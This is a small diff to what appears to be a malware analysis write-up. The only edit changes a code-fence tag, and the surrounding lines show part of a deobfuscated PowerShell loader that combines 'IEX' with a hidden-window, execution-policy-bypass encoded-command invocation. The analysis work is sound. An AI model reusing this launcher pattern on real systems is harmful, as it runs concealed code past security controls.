@@ -40,7 +40,7 @@ function downloadFile() {
 
 To analyze we replace a new line after a semicolon `;`, as in powershell is a statement separator. 
 
-```PowerShell
+```powershell
 $x=''
 $y='IEX'
 $z='powershell.exe -w h -ep b -e '
